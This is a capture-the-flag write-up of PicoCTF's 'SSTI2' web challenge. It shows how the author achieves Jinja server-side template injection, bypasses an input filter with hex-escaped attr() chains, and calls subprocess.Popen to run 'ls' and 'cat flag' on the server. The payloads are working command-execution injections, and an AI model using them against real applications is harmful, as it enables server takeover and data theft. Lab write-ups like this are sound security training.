# SSTI2
 
**Date**: 12-23-2025

**Author**: Lukas Somwong  

**Platform**: PicoCTF PicoGym

**Category**: Web

**Dificulty**: Medium

## Solution

The name of the challenge pointed towards using template injection to find the flag. 
Inputting `{{7*7}}` resulted in the expression 7*7 to evaluate as 49 as shown in the 
resulting announcement indicating jinja was being used.

![alt text](<../images/Screenshot 2025-12-23 at 8.59.29 PM.png>)
![alt text](<../images/Screenshot 2025-12-23 at 9.00.34 PM.png>)

As I did in the SSTI1 challenge, I used the following expression to attept at getting all classes in the python enviornment by first reaching the object class through the inheritance tree of the string class. This did not work and resulted in an announcement indicating improved input sanitization.

`{{ ''.__class__.__mro__[1].__subclasses__() }}`

![alt text](<../images/Screenshot 2025-12-23 at 9.22.36 PM.png>)

Entering any expression utilizing characters such as '.', '_', '[', and ']' resulted in the same announcement.

I attempted to utilizing the following expression which replaced such characters with alternative template filters which appeared to bypass the sanitization.

`{{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(1)|attr('\x5f\x5fsubclasses\x5f\x5f')()}}`

![alt text](<../images/Screenshot 2025-12-23 at 9.02.13 PM.png>)

Like in the previous SSTI challenge, I discovered the location of subprocess.Popen which would allow me to execute shell commands on the server from the client. 
I used ls to list files/folders in the current directory and used communicate()[0] to get the standard output.

`{{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(1)|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(356)('ls',shell=True,stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)}}`

The website output this announcment, showing a file called 'flag' in the current directory.

`b'__pycache__\napp.py\nflag\nrequirements.txt\n'`

I used cat to read the flag file which resulted in the announcement displaying the flag.

`{{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(1)|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(356)('cat flag',shell=True,stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)}}`

![alt text](<../images/Screenshot 2025-12-23 at 9.41.31 PM.png>)